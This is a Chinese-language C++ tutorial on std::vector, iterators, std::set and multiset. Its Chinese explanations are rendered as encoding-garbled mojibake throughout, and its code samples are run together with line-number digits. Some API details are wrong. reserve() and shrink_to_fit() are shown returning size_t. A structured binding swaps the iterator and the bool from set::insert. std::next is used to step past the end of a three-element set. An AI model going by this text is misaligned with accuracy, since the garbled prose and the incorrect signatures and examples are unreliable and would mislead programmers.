&amp;operator[](size_t i) const noexcept;// ä¸ºäº†é˜²æ­¢ä¸å°å¿ƒè¶Šç•Œï¼Œå¯ä»¥ç”¨ a.at(i) æ›¿ä»£ a[i]// at å‡½æ•°ä¼šæ£€æµ‹ç´¢å¼• i æ˜¯å¦è¶Šç•Œint &amp;at(size_t i);int const &amp;at(size_t i) const;// ... explicit vector(size_t n); æ˜¾å¼æ„é€ å‡½æ•°ä¼šè°ƒç”¨å…ƒç´ çš„é»˜è®¤æ„é€ å‡½æ•°ï¼Œæ•°å­—ç±»å‹ä¼šåˆå§‹åŒ–ä¸º 0ï¼Œstring ä¼šåˆå§‹åŒ–ä¸ºç©ºå­—ç¬¦ä¸²ï¼ŒæŒ‡é’ˆç±»å‹ä¼šåˆå§‹åŒ–ä¸º nullptrã€‚ std::execution::par capacity() å‡½æ•°æŸ¥è¯¢å·²ç»åˆ†é…å†…å­˜çš„å¤§å°ï¼Œå³æœ€å¤§å®¹é‡ï¼› 1size_t capacity() const noexcept; size() è¿”å›çš„å…¶å®æ˜¯å·²ç»å­˜å‚¨äº†æ•°æ®çš„æ•°ç»„é•¿åº¦ã€‚size èŒƒå›´å†…çš„æ•°æ®éƒ½æ˜¯åˆå§‹åŒ–çš„ã€‚ size åˆ° capacity ä¹‹é—´çš„å†…å­˜æ˜¯æ²¡æœ‰åˆå§‹åŒ–çš„ã€‚ å¦å¤–ï¼Œä½¿ç”¨ reserve() å‡½æ•°é¢„ç•™ä¸€å®šçš„å®¹é‡ï¼Œè¿™æ ·ä¹‹åå°±ä¸ä¼šå‡ºç°å®¹é‡ä¸è¶³è€Œéœ€è¦åŠ¨æ€æ‰©å®¹å½±å“æ€§èƒ½äº†ï¼ˆå‰ææ˜¯ä¿è¯å®¹é‡ä¸€å®šè¶³å¤Ÿï¼‰ã€‚æ­¤å¤–ï¼Œè¿˜è¦æ³¨æ„ reserve æ—¶ä¹Ÿä¼šç§»åŠ¨å…ƒç´ ã€‚ 1size_t reserve(size_t n); reserve() åªæ˜¯ç”³è¯·å†…å­˜ï¼Œä¸åšåˆå§‹åŒ–ã€‚ resize é™¤äº†å¯ä»¥åœ¨æ„é€ å‡½æ•°ä¸­æŒ‡å®šæ•°ç»„çš„å¤§å°ï¼Œè¿˜å¯ä»¥ä¹‹åå†é€šè¿‡ resize å‡½æ•°è®¾ç½®å¤§å°ã€‚ 123456// vector&lt;int&gt; a(4);// ç­‰ä»·äºï¼š// vector&lt;int&gt; a;// a.resize(4);void resize(size_t n);void resize(size_t n, int const &amp;val); è°ƒç”¨ resize(n) çš„æ—¶å€™ï¼Œä¸è¶³éƒ¨åˆ†ï¼Œä¼šç”¨ 0 å¡«å……å…ƒç´ ï¼ŒåŸæœ‰å…ƒç´ ä¼šä¿æŒä¸å˜ã€‚ 123456789// vector&lt;int&gt; a = &#123;1, 2&#125;;// a.resize(4);// ç­‰ä»·äºï¼š// vector&lt;int&gt; a = &#123;1, 2, 0, 0&#125;;// vector&lt;int&gt; a = &#123;1, 2, 3, 4, 5, 6&#125;;// a.resize(4);// ç­‰ä»·äºï¼š// vector&lt;int&gt; a = &#123;1, 2, 3, 4&#125;; å½“ resize çš„ç›®æ ‡é•¿åº¦å¤§äºåŸæœ‰çš„å®¹é‡ï¼ˆcapacityï¼‰æ—¶ï¼Œå°±éœ€è¦é‡æ–°åˆ†é…ä¸€æ®µæ›´å¤§çš„è¿ç»­å†…å­˜ï¼Œå¹¶æŠŠåŸæ•°ç»„é•¿åº¦çš„éƒ¨åˆ†ç§»åŠ¨è¿‡å»ï¼Œå¤šå‡ºæ¥çš„éƒ¨åˆ†åˆ™ç”¨ 0 æ¥å¡«å……ã€‚å¯¼è‡´å…ƒç´ çš„åœ°å€ä¼šæœ‰æ‰€æ”¹ã€‚ shrink_to_fit å½“ resize åˆ°ä¸€ä¸ªæ›´å°çš„å¤§å°ä¸Šæ—¶ï¼Œå¤šä½™çš„å®¹é‡ä¸ä¼šé‡Šæ”¾ï¼Œè€Œæ˜¯ç»§ç»­ä¿ç•™ã€‚ shrink_to_fit é‡Šæ”¾æ‰å¤šä½™çš„å®¹é‡ï¼Œåªä¿ç•™åˆšå¥½ä¸º size() å¤§å°çš„å®¹é‡ã€‚ shrink_to_fit ä¼šé‡æ–°åˆ†é…ä¸€æ®µæ›´å°å†…å­˜ï¼Œä»–åŒæ ·æ˜¯ä¼šæŠŠå…ƒç´ ç§»åŠ¨åˆ°æ–°å†…å­˜ä¸­çš„ï¼Œå› æ­¤è¿­ä»£å™¨å’ŒæŒ‡é’ˆä¹Ÿä¼šå¤±æ•ˆã€‚ 1size_t shrink_to_fit(); clear clear å‡½æ•°å¯ä»¥æ¸…ç©ºè¯¥æ•°ç»„ï¼Œä¹Ÿå°±ç›¸å½“äºæŠŠé•¿åº¦è®¾ä¸ºé›¶ï¼Œå˜æˆç©ºæ•°ç»„ã€‚ å®¹é‡(capacity)è¿˜æ˜¯æ‘†åœ¨é‚£é‡Œï¼Œclear ä»…ä»…åªæ˜¯æŠŠæ•°ç»„å¤§å°(size)æ ‡è®°ä¸º 0 è€Œå·²ã€‚ è¦çœŸæ­£é‡Šæ”¾æ‰å†…å­˜ï¼Œå¯ä»¥åœ¨ clear ä¹‹åå†è°ƒç”¨ shrink_to_fitï¼Œè¿™æ ·æ‰ä¼šè®©å®¹é‡ä¹Ÿå˜æˆ 0ï¼ˆè¿™æ—¶ vector çš„ data ä¼šè¿”å› nullptrï¼‰ã€‚ 1234// a.clear();// ç­‰ä»·äºï¼š// a.resize(0); æˆ– a = &#123;&#125;;void clear() noexcept; push_back 123456// vector&lt;int&gt; a = &#123;1, 2&#125;;// a.push_back(3);// ç­‰ä»·äºï¼š// vector&lt;int&gt; a = &#123;1, 2, 3&#125;;void push_back(int const &amp;val);void push_back(int &amp;&amp;val); // C++11 æ–°å¢ pop_back å‡½æ•°åˆ™æ˜¯å’Œ push_back ç›¸åã€‚ è¦æ³¨æ„çš„æ˜¯ pop_back å‡½æ•°çš„è¿”å›ç±»å‹æ˜¯ voidï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰è¿”å›å€¼ï¼Œå¦‚æœéœ€è¦è·å–åˆ é™¤çš„å€¼ï¼Œå¯ä»¥åœ¨ pop_back() ä¹‹å‰å…ˆé€šè¿‡ back() è·å–æœ«å°¾å…ƒç´ çš„å€¼ï¼Œå®ç° pop æ•ˆæœã€‚ data data() ä¼šè¿”å›æŒ‡å‘æ•°ç»„ä¸­é¦–ä¸ªå…ƒç´ çš„æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯ç­‰ä»·äº &amp;a[0]ã€‚ç”±äº vector æ˜¯è¿ç»­å­˜å‚¨çš„æ•°ç»„ï¼Œå› æ­¤åªè¦å¾—åˆ°äº†é¦–åœ°å€ï¼Œä¸‹ä¸€ä¸ªå…ƒç´ çš„åœ°å€åªéœ€æŒ‡é’ˆ +1 å³å¯ã€‚ 12int *data() noexcept;int const *data() const noexcept; data() æŒ‡é’ˆæ˜¯å¯¹ vector çš„ä¸€ç§å¼•ç”¨ï¼Œå®é™…å¯¹è±¡ç”Ÿå‘½å‘¨æœŸä»ç”± vector ç±»æœ¬èº«ç®¡ç†ã€‚ ç”¨ä»–æ¥è·å–ä¸€ä¸ª C è¯­è¨€åŸå§‹æŒ‡é’ˆ int *ï¼Œå¾ˆæ–¹ä¾¿ç”¨äºè°ƒç”¨ C è¯­è¨€çš„å‡½æ•°å’Œ API ç­‰ï¼ŒåŒæ—¶è¿˜èƒ½äº«å—åˆ° vector å®¹å™¨ RAII çš„å®‰å…¨æ€§ã€‚ å¦‚æœç”¨ new/delete æˆ–è€… malloc/free å°±å¾ˆå®¹æ˜“å‡ºç°å¿˜è®°é‡Šæ”¾å†…å­˜çš„æƒ…å†µï¼Œé€ æˆå†…å­˜æ³„éœ²ã€‚ è€Œ vector ä¼šåœ¨ç¦»å¼€ä½œç”¨åŸŸæ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨è§£æ„å‡½æ•°ï¼Œé‡Šæ”¾å†…å­˜ï¼Œå°±ä¸å¿…æ‰‹åŠ¨é‡Šæ”¾äº†ï¼Œæ›´å®‰å…¨ã€‚ å¦‚æœéœ€è¦åœ¨ä¸€ä¸ªè¯­å¥å—å¤–ä»ç„¶ä¿æŒ data() å¯¹æ•°ç»„çš„å¼±å¼•ç”¨æœ‰æ•ˆï¼Œå¯ä»¥æŠŠè¯­å¥å—å†…çš„ vector å¯¹è±¡ç§»åŠ¨åˆ°å¤–é¢çš„ä¸€ä¸ª vector å¯¹è±¡ä¸Šã€‚vector åœ¨ç§»åŠ¨æ—¶æŒ‡é’ˆä¸ä¼šå¤±æ•ˆï¼š 12345678910111213141516171819#include &lt;vector&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;using namespace std;vector&lt;int&gt; holder;int main() &#123; int *p; &#123; vector&lt;int&gt; a = &#123;1, 2, 3&#125;; p = a.data(); cout &lt;&lt; p[0] &lt;&lt; endl; cout &lt;&lt; p[0] &lt;&lt; endl; holder = std::move(a); // å»¶ç»­ç”Ÿå‘½å‘¨æœŸ &#125; cout &lt;&lt; p[0] &lt;&lt; endl; return 0;&#125; insert insert å‡½æ•°ï¼Œä»–çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦æ’å…¥çš„ä½ç½®ï¼ˆç”¨è¿­ä»£å™¨è¡¨ç¤ºï¼‰ï¼Œç¬¬äºŒä¸ªå‚æ•°åˆ™æ˜¯è¦æ’å…¥çš„å€¼ã€‚ insert åœ¨å®¹é‡ä¸è¶³æ—¶ï¼ŒåŒæ ·ä¼šé€ æˆé‡æ–°åˆ†é…ä»¥æ±‚æ‰©å®¹ï¼Œä¼šç§»åŠ¨å…¶ä¸­æ‰€æœ‰å…ƒç´ ï¼Œè¿™æ—¶æ‰€æœ‰ä¹‹å‰ä¿å­˜çš„è¿­ä»£å™¨éƒ½ä¼šå¤±æ•ˆã€‚ insert å‡½æ•°ï¼Œé‡å¤æ’å…¥å¤šä¸ªç›¸åŒçš„å€¼ã€‚æˆ–è€…ç›´æ¥æ’å…¥ä¸€ä¸ªåˆå§‹åŒ–åˆ—è¡¨ã€‚æˆ–è€…å¦ä¸€ä¸ªå®¹å™¨çš„èµ·æ­¢è¿­ä»£å™¨ã€‚ 12345a.insert(æ’å…¥ä½ç½®, é‡å¤å¤šå°‘æ¬¡, æ’å…¥çš„å€¼);a.insert(æ’å…¥ä½ç½®, &#123;æ’å…¥å€¼1, æ’å…¥å€¼2, ...&#125;);a.insert(æ’å…¥ä½ç½®, b.begin(), b.end());// å¯¹äº C è¯­è¨€çš„æ•°æ®ç»“æ„ä½¿ç”¨å…¨å±€çš„ std::begin(), std::end() å‡½æ•°a.insert(æ’å…¥ä½ç½®, std::begin(c), std::end(c)); emplace 1iterator emplace (const_iterator pos, args...); args... è¡¨ç¤ºä¸æ–°æ’å…¥å…ƒç´ çš„æ„é€ å‡½æ•°ç›¸å¯¹åº”çš„å¤šä¸ªå‚æ•°ã€‚ emplace() æ¯æ¬¡åªèƒ½æ’å…¥ä¸€ä¸ªå…ƒç´ ï¼Œè€Œä¸æ˜¯å¤šä¸ªã€‚ emplace() é«˜æ•ˆä¹‹å¤„åœ¨äºï¼Œç›´æ¥åœ¨å®¹å™¨ç”³è¯·å†…å­˜ä¹‹ä¸Šè¿›è¡Œæ„é€ ã€‚è€Œ insert() æ˜¯å…ˆæ„é€ å¥½å¯¹è±¡ï¼Œåœ¨æ‹·è´æˆ–è€…ç§»åŠ¨åˆ°å®¹å™¨çš„å†…å­˜ä¸­ã€‚ assign å’Œ insert ä¸åŒçš„æ˜¯ï¼Œä»–ä¼šæŠŠæ—§æœ‰çš„æ•°ç»„å®Œå…¨è¦†ç›–æ‰ï¼Œå˜æˆä¸€ä¸ªæ–°çš„æ•°ç»„ã€‚ a.assign(beg, end) åŸºæœ¬å’Œ a = vector&lt;int&gt;(beg, end) ç­‰ä»·ï¼Œå”¯ä¸€çš„åŒºåˆ«æ˜¯åè€…ä¼šé‡æ–°åˆ†é…å†…å­˜ï¼Œè€Œå‰è€…ä¼šä¿ç•™åŸæ¥çš„å®¹é‡ä¸ä¼šé‡Šæ”¾æ‰ã€‚ 123456template &lt;class It&gt; // è¿™é‡Œ It å¯ä»¥æ˜¯å…¶ä»–å®¹å™¨çš„è¿­ä»£å™¨ç±»å‹void assign(It beg, It end);// æŠŠ vector æ‰¹é‡å¡«æ»¡ä¸€ä¸ªç‰¹å®šçš„å€¼void assign(size_t n, int const &amp;val);// æ¥å—ä¸€ä¸ªåˆå§‹åŒ–åˆ—è¡¨ä½œä¸ºå‚æ•°void assign(initializer_list&lt;int&gt; val); a.assign({x, y, ...}) å’Œ a = {x, y, ...} å®Œå…¨ç­‰ä»·ï¼Œéƒ½ä¼šä¿ç•™åŸæ¥çš„å®¹é‡ã€‚è€Œå’Œ a = vector&lt;int&gt;{x, y, ...} å°±ä¸ç­‰ä»·ï¼Œè¿™ä¸ªä¼šé‡æ–°åˆ†é…å†…å­˜ã€‚ erase erase çš„å¤æ‚åº¦æœ€åæƒ…å†µæ˜¯åˆ é™¤ç¬¬ä¸€ä¸ªå…ƒç´  O(n)ã€‚å¦‚æœåˆ çš„æ˜¯æœ€åä¸€ä¸ªå…ƒç´ åˆ™å¤æ‚åº¦ä¸º O(1)ã€‚å› ä¸º erase ä¼šç§»åŠ¨ pos ä¹‹åçš„é‚£äº›å…ƒç´ ï¼Œä¿æŒè¿ç»­æ•°æ®åˆ†é…ã€‚ 123iterator erase(const_iterator pos);// æ‰¹é‡åˆ é™¤ä¸€ä¸ªåŒºé—´iterator erase(const_iterator beg, const_iterator end); Iterator ä¸ºä»€ä¹ˆä¼šæœ‰iteratorè®¾è®¡çš„éœ€è¦ï¼Ÿ ä¸ºä¸åŒå®¹å™¨æä¾›ä¸€ä¸ªæ›´ä¸€èˆ¬åŒ–çš„æ“ä½œæ¥å£ å‡è®¾éœ€è¦ä¸€ä¸ªprintå‡½æ•°ï¼Œè¦æ‰“å°å®¹å™¨ä¸­å­—ç¬¦å…ƒç´ ã€‚ç®€å•å®ç°æ˜¯ï¼š 12345678910111213void print(vector&lt;char&gt; const &amp;a) &#123; for (int i = 0; i &lt; a.size(); i++) &#123; cout &lt;&lt; a[i] &lt;&lt; endl; &#125;&#125;void print(string const &amp;a) &#123; for (int i = 0; i &lt; a.size(); i++) &#123; cout &lt;&lt; a[i] &lt;&lt; endl; &#125;&#125;... vector å’Œ string çš„åº•å±‚éƒ½æ˜¯è¿ç»­çš„ç¨ å¯†æ•°ç»„ï¼Œæ”¹ç”¨é¦–åœ°å€æŒ‡é’ˆå’Œæ•°ç»„é•¿åº¦åšå‚æ•°ã€‚ è¿™æ · print åœ¨æ— éœ€çŸ¥é“å®¹å™¨å…·ä½“ç±»å‹çš„æƒ…å†µä¸‹ï¼Œåªç”¨æœ€ç®€å•çš„æ¥å£ï¼ˆé¦–åœ°å€æŒ‡é’ˆï¼‰å°±å®Œæˆäº†éå†å’Œæ‰“å°çš„æ“ä½œã€‚ 12345678910111213void print(char const *a, size_t n) &#123; for (int i = 0; i &lt; n; i++) &#123; cout &lt;&lt; a[i] &lt;&lt; endl; &#125;&#125;int main() &#123; vector&lt;char&gt; a = &#123;'h', 'j', 'k', 'l'&#125;; print(a.data(), a.size()); string b = &#123;'h', 'j', 'k', 'l'&#125;; print(b.data(), b.size()); return 0;&#125; é€šè¿‡ç»™æŒ‡é’ˆåŠ å‡è¿ç®—ï¼Œé€‰æ‹©å…¶ä¸­ä¸€éƒ¨åˆ†è¿ç»­çš„å…ƒç´ æ¥æ‰“å°ã€‚ å†æ”¹å˜ä¸€äº›ï¼Œæ”¹ç”¨é¦–åœ°å€æŒ‡é’ˆå’Œå°¾åœ°å€æŒ‡é’ˆã€‚ç”¨æŒ‡é’ˆä½œä¸ºè¿­ä»£å˜é‡ã€‚ å°¾åœ°å€æŒ‡é’ˆå®é™…ä¸Šæ˜¯æŒ‡å‘æœ«å°¾å…ƒç´ å†å¾€ååä¸€ä¸ªå…ƒç´ çš„æŒ‡é’ˆã€‚ æ•°ç»„é•¿åº¦ä¸º 0 å°±æ˜¯ begptr == endptr çš„æƒ…å†µï¼›endptr - begptr æ¥ç®—å‡ºæ•°ç»„çš„é•¿åº¦ï¼›åˆ¤æ–­æ˜¯å¦ç»§ç»­å¾ªç¯çš„æ¡ä»¶ä¸º ptr != endptr ã€‚ 1234567891011121314151617181920template &lt;class Ptr&gt;void print(Ptr begptr, Ptr endptr) &#123; for (Ptr ptr = begptr; ptr != endptr; ++ptr) &#123; auto value = *ptr; cout &lt;&lt; value &lt;&lt; endl; &#125;&#125;int main() &#123; vector&lt;char&gt; a = &#123;'h', 'j', 'k', 'l'&#125;; char const *abegptr = a.data(); char const *aendptr = a.data() + a.size(); print(abegptr, aendptr); vector&lt;int&gt; b = &#123;1, 2, 3, 4&#125;; int const *bbegptr = b.data(); int const *bendptr = b.data() + b.size(); print(bbegptr, bendptr); return 0;&#125; é€šè¿‡æ“ä½œç¬¦é‡è½½ï¼Œé€‚é…ä¸åŒå†…å­˜å¸ƒå±€çš„å®¹å™¨ç±»å‹ ä¸Šè¿°é¦–æŒ‡é’ˆå’Œå°¾æŒ‡é’ˆçš„ç»„åˆæ–¹æ³•ï¼Œçš„ç¡®èƒ½èƒœä»» vector è¿™ç§è¿ç»­æ•°ç»„ï¼Œä½†æ˜¯å¯¹äº list è¿™ç§ä¸è¿ç»­çš„å†…å­˜çš„å®¹å™¨å°±æ²¡è¾™äº†ã€‚ list&lt;char&gt;::iterator æ˜¯ä¸€ä¸ªç‰¹æ®Šå®šä¹‰è¿‡çš„ç±»å‹ï¼Œå…¶å…·æœ‰ != å’Œ ++ ä»¥åŠ * è¿™äº›è¿ç®—ç¬¦çš„é‡è½½ã€‚æŠŠ ++ å¯¹åº”åˆ° é“¾è¡¨çš„ curr = curr-&gt;next ä¸Šã€‚ ç”¨èµ·æ¥å°±åƒæ™®é€šçš„æŒ‡é’ˆï¼Œä½†å†…éƒ¨å´é€šè¿‡è¿ç®—ç¬¦é‡è½½é€‚é…ä¸åŒå®¹å™¨çš„ç‰¹æ®Šç±»ï¼Œå°±æ˜¯è¿­ä»£å™¨(iterator)ï¼Œè¿­ä»£å™¨æ˜¯ STL ä¸­å®¹å™¨å’Œç®—æ³•ä¹‹é—´çš„æ¡¥æ¢ã€‚ 123456789101112131415template &lt;class Ptr&gt;void print(Ptr begptr, Ptr endptr) &#123; for (Ptr ptr = begptr; ptr != endptr; ptr++) &#123; auto value = *ptr; cout &lt;&lt; value &lt;&lt; endl; &#125;&#125;int main() &#123; list&lt;char&gt; a = &#123;'h', 'j', 'k', 'l'&#125;; list&lt;char&gt;::iterator begptr = a.begin(); list&lt;char&gt;::iterator endptr = a.end(); print(begptr, endptr); return 0;&#125; ++ ++p ä¼šè¿”å›è‡ªå¢åçš„å€¼ p + 1ï¼Œè¿™å’Œ p += 1 å®Œå…¨ä¸€æ ·ï¼ŒåŒæ ·å› ä¸ºè¿”å›çš„æ˜¯ä¸€ä¸ªå·¦å€¼å¼•ç”¨ã€‚ p++ ä¼šè¿”å›è‡ªå¢å‰çš„å€¼ pï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªå³å€¼ã€‚åç½®è‡ªå¢éœ€è¦å…ˆä¿å­˜æ—§çš„è¿­ä»£å™¨ï¼Œç„¶åè‡ªå¢è‡ªå·±ï¼Œå†è¿”å›æ—§è¿­ä»£å™¨ï¼Œå¯èƒ½ä¼šæ¯”è¾ƒä½æ•ˆã€‚ 123456789101112131415161718192021struct Iterator &#123; Node* curr; // æ— å‚++ å‰ç½®++ Iterator&amp; operator++() &#123; curr = curr-&gt;next; return *this; &#125; // å¸¦å‚++ åç½®++ Iterator operator++(int) &#123; Iterator tmp = *this; this-&gt;operator++(); return tmp; &#125; T&amp; operator*() const &#123; return curr-&gt;value; &#125; bool operator!=(Iterator const&amp; that) const &#123; return curr != that.curr; &#125;&#125;; åŒåå‡½æ•°åªèƒ½é€šè¿‡å‚æ•°åˆ—è¡¨ç±»å‹æ¥åŒºåˆ†ï¼Œè¿™ä¸ª int ç±»å‹å‚æ•°æ²¡æœ‰ä»»ä½•å®é™…æ„ä¹‰ï¼Œåªæ˜¯ä¸ºäº†åŒºåˆ†ä¸åŒçš„é‡è½½ã€‚ ç¼–è¯‘å™¨ä¼šåœ¨ p++ çš„æ—¶å€™è‡ªåŠ¨æ”¹æˆè°ƒç”¨ p.operator++(0)ã€‚ set setä¼šè‡ªåŠ¨ç»™å…¶ä¸­çš„å…ƒç´ ä»å°åˆ°å¤§æ’åºï¼Œset&lt;T, CompT&gt; CompTå®šä¹‰æ’åºå‡½æ•° setä¼šå»é‡ çº¢é»‘æ ‘å‚¨å­˜ï¼Œä¸æ”¯æŒéšæœºè®¿é—® é«˜æ•ˆçš„æŒ‰å€¼æŸ¥æ‰¾ Iterator æä¾›çš„è¿ç®—ç¬¦é‡è½½ å…·æœ‰æ­¤è¿­ä»£å™¨çš„å®¹å™¨ å¯¹åº”çš„ C++20 concept è¾“å…¥è¿­ä»£å™¨ *ï¼ˆå¯è¯»å–ï¼‰ï¼Œ!=ï¼Œ==ï¼Œ++ï¼ˆä¸€æ¬¡æ€§ï¼‰ istream_iterator input_iterator è¾“å‡ºè¿­ä»£å™¨ *ï¼ˆå¯å†™å…¥ï¼‰ï¼Œ!=ï¼Œ==ï¼Œ++ï¼ˆä¸€æ¬¡æ€§ï¼‰ back_insert_iterator output_iterator å‰å‘è¿­ä»£å™¨ *ï¼Œ!=ï¼Œ==ï¼Œ++ forward_list forward_iterator åŒå‘è¿­ä»£å™¨ *ï¼Œ!=ï¼Œ==ï¼Œ++ï¼Œ-- setï¼Œmapï¼Œlist bidirectional_iterator éšæœºè®¿é—®è¿­ä»£å™¨ *ï¼Œ!=ï¼Œ==ï¼Œ++ï¼Œ--ï¼Œ+ï¼Œ-ï¼Œ+=ï¼Œ-=ï¼Œ[] vectorï¼Œarrayï¼Œdeque random_access_iterator è¿­ä»£å™¨å¤–åŒ…è£… å’Œä»–æ‰€åŒ…è£…çš„è¿­ä»£å™¨ä¿æŒä¸€è‡´ reverse_iterator å’Œæ‰€åŒ…è£…çš„è¿­ä»£å™¨ä¸€è‡´ å‰å‘è¿­ä»£å™¨ï¼åŒå‘è¿­ä»£å™¨ï¼éšæœºè®¿é—®è¿­ä»£å™¨ã€‚ è¿™æ„å‘³ç€å¦‚æœä¸€ä¸ªSTLæ¨¡æ¿å‡½æ•°ï¼ˆæ¯”å¦‚std::findï¼‰è¦æ±‚è¿­ä»£å™¨æ˜¯å‰å‘è¿­ä»£å™¨å³å¯ï¼Œé‚£ä¹ˆä¹Ÿå¯ä»¥ç»™ä»–éšæœºè®¿é—®è¿­ä»£å™¨ï¼Œå› ä¸ºå‰å‘è¿­ä»£å™¨æ˜¯éšæœºè®¿é—®è¿­ä»£å™¨çš„å­é›†ã€‚ set ä¸æ”¯æŒéšæœºè®¿é—®ï¼Œæ²¡æœ‰æä¾› + å’Œ += çš„é‡è½½ã€‚ std::next set çš„ + 3 è®¿é—®ï¼Œé€šè¿‡std::nextå®ç°ï¼š 123set&lt;int&gt; a = &#123;1, 2, 3&#125;;set&lt;int&gt;::iterator a_it = a.begin();a_it = std::next(a_it, 3); // set[3] std::advance ä¼šå°±åœ°è‡ªå¢ï¼š 1std::advance(a_it, 3); // ç›¸å½“äº+= next å’Œ advance åŒæ ·æ”¯æŒè´Ÿæ•°ã€‚ ä¸ next å¯¹åº”çš„æœ‰ std::prev ï¼Œå‘å‰è®¿é—®ã€‚ æ­¤å¤– std::distance å¯æ±‚å‡ºä¸¤ä¸ªè¿­ä»£å™¨ä¹‹é—´çš„è·ç¦»ã€‚ Funtions insert 1pair&lt;iterator, bool&gt; insert(int val); insert å‡½æ•°çš„è¿”å›å€¼æ˜¯ä¸€ä¸ª pair ç±»å‹ï¼Œä¹Ÿå°±æ˜¯è¯´ä»–åŒæ—¶è¿”å›äº†ä¸¤ä¸ªå€¼ã€‚å…¶ä¸­ç¬¬ä¸€ä¸ªè¿”å›å€¼æŒ‡å‘æ’å…¥/ç°æœ‰å…ƒç´ çš„è¿­ä»£å™¨ï¼›ç¬¬äºŒä¸ªè¿”å›å€¼æ˜¯ bool ç±»å‹ï¼ŒæŒ‡ç¤ºäº†æ’å…¥æ˜¯å¦æˆåŠŸã€‚ pair ä½œä¸ºè¿”å›å€¼ï¼Œå¯ä»¥ç›´æ¥ï¼š 12...return &#123;first, second&#125;; C++ 17 å¯ä»¥ä½¿ç”¨ç»“æ„åŒ–ç»‘å®šæ‹†è§£ pair 12345auto [ok, it] = b_set.insert(3);// ç­‰ä»·äºauto tmp = b_set.insert(3);auto ok = tmp.first;auto it = tmp.second; find 12iterator find(int const &amp;val) const;size_t count(int const &amp;val) const; set.find(x) != set.end() åˆ¤æ–­é›†åˆ set ä¸­æ˜¯å¦å­˜åœ¨å…ƒç´  xã€‚ç›¸æ¯” set.count(x) != 0 ä¼šé«˜æ•ˆä¸€äº›ã€‚ erase 12size_t erase(int const &amp;val);iterator erase(iterator first, iterator last); erase è¿”å›ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºè¢«ä»–åˆ é™¤å…ƒç´ çš„ä¸ªæ•°ã€‚ä½¿ç”¨ä¸Šæ¯”å¦‚ï¼šset.erase(std::prev(set.end())) ä¼šåˆ é™¤é›†åˆä¸­æœ€å¤§çš„å…ƒç´ ã€‚ erase è¿˜æ”¯æŒè¾“å…¥ä¸¤ä¸ªè¿­ä»£å™¨ä½œä¸ºå‚æ•°ã€‚åˆ é™¤å‰å¼€åé—­åŒºé—´ [beg, end) å†…çš„å…ƒç´ ã€‚ å…³äºåŒºé—´ï¼Œset.lower_bound(x) æ‰¾ç¬¬ä¸€ä¸ªå¤§äºç­‰äº x çš„å…ƒç´ ã€‚set.upper_bound(x) æ‰¾ç¬¬ä¸€ä¸ªå¤§äº x çš„å…ƒç´ ã€‚ 12// åˆ é™¤ [3, 6] åŒºé—´å†…çš„å…ƒç´ a_set.erase(a_set.lower_bound(3), a_set.upper_bound(6)); æ“ä½œ å®ç°æ–¹æ³• å¢ a.insert(x) åˆ  a.erase(x) æˆ–è€… a.erase(a.find(x)) æ”¹ ä¸€æ—¦æ’å…¥å°±æ— æ³•ä¿®æ”¹ï¼Œåªèƒ½å…ˆåˆ å†å¢ æŸ¥ a.find(x) != a.end() æˆ–è€… a.count(x) å®¹å™¨è½¬æ¢ 12345template &lt;class ForwardIt&gt;explicit vector(ForwardIt beg, ForwardIt end);template &lt;class ForwardIt&gt;explicit set(ForwardIt beg, ForwardIt end); vector çš„æ„é€ å‡½æ•°å¯ä»¥æ¥å—ä»»ä½•å‰å‘è¿­ä»£å™¨ã€‚ä¸ä¸€å®šæ˜¯ vector è‡ªå·±çš„è¿­ä»£å™¨å“¦ï¼Œä»»ä½•å‰å‘è¿­ä»£å™¨ï¼è€Œ set æ˜¯åŒå‘è¿­ä»£å™¨ï¼Œè¦†ç›–äº†å‰å‘è¿­ä»£å™¨ï¼Œæ»¡è¶³è¦æ±‚ã€‚ åè¿‡æ¥ï¼Œå¯ä»¥æŠŠ vector è½¬æˆ setã€‚set(b.begin(), b.end()) ã€‚ æ‰€ä»¥å¯ä»¥å®ç°ç®€å•çš„vectoræ’åºåŠŸèƒ½ï¼š 123vector&lt;int&gt; arr = &#123;4,3,1,5&#125;;set&lt;int&gt; tmp(arr.begin(), arr.end());arr.assign(tmp.begin(), tmp.end()); // assign åˆ©ç”¨ç°æœ‰åˆ†é…å†…å­˜ clear 123a_set.clear();a_set = &#123;&#125;;a_set.erase(a_set.begin(), a_set.end()); emplace 123pair&lt;iterator,bool&gt; emplace (Args&amp;&amp;... args);iterator emplace_hint (const_iterator position, Args&amp;&amp;... args); åªéœ€è¦ä¼ å…¥æ„å»ºæ–°å…ƒç´ æ‰€éœ€çš„æ•°æ®å³å¯ï¼Œè¯¥æ–¹æ³•å¯ä»¥è‡ªè¡Œåˆ©ç”¨è¿™äº›æ•°æ®æ„å»ºå‡ºè¦æ·»åŠ çš„å…ƒç´ ã€‚ emplace_hint æ–¹æ³•éœ€è¦é¢å¤–ä¼ å…¥ä¸€ä¸ªè¿­ä»£å™¨ï¼Œç”¨æ¥æŒ‡æ˜æ–°å…ƒç´ æ·»åŠ åˆ° set å®¹å™¨çš„å…·ä½“ä½ç½®ï¼ˆæ–°å…ƒç´ ä¼šæ·»åŠ åˆ°è¯¥è¿­ä»£å™¨æŒ‡å‘å…ƒç´ çš„å‰é¢ï¼‰ã€‚ ç›¸æ¯”å…·æœ‰åŒæ ·åŠŸèƒ½çš„ insert() æ–¹æ³•ï¼Œå®ŒæˆåŒæ ·çš„ä»»åŠ¡ï¼Œemplace() å’Œ emplace_hint() çš„æ•ˆç‡ä¼šæ›´é«˜ã€‚ multiset multiset æ˜¯ set ä¸å»é‡ç‰ˆæœ¬ã€‚ä½¿ç”¨ç±»ä¼¼ã€‚ æ”¯æŒç­‰å€¼åŒºé—´æŸ¥è¯¢ã€‚equal_range è¿”å›çš„ç­‰å€¼åŒºé—´ã€‚ 1pair&lt;iterator, iterator&gt; equal_range(int const &amp;val) const; ä¸åŒ set æˆå‘˜å‡½æ•° å‡½æ•° å«ä¹‰ set multiset unordered_set insert(x) æ’å…¥ä¸€ä¸ªå…ƒç´  x âˆš âˆš âˆš erase(x) åˆ é™¤æ‰€æœ‰ç­‰äº x çš„å…ƒç´  âˆš âˆš âˆš count(x) æœ‰å¤šå°‘ä¸ªç­‰äº x çš„å…ƒç´  âˆšï¼Œ0æˆ–1 âˆš 